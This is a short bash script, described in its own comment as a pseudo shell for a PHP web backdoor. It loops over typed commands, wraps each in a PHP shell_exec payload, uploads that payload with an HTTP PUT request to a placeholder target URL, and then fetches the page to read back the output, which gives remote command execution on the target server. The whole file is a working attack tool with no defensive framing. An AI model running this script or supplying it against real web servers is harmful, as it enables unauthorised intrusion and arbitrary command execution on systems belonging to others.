#!/bin/bash
# a pseudo shell to get feedback on a web php backdoor where attacker can use PUT requests

exec () {
	payload="<?php echo shell_exec('$1 2>&1'); ?>";
	curl --silent -X PUT <Target URL/pseudo-shell.php> -H 'Expect: ' -d "$payload";
	result=$(curl <Target URL/pseudo-shell.php> 2>/dev/null)
}

while true; do
	echo -n "> "
	read cmd
	exec "$cmd"
	echo $result
done


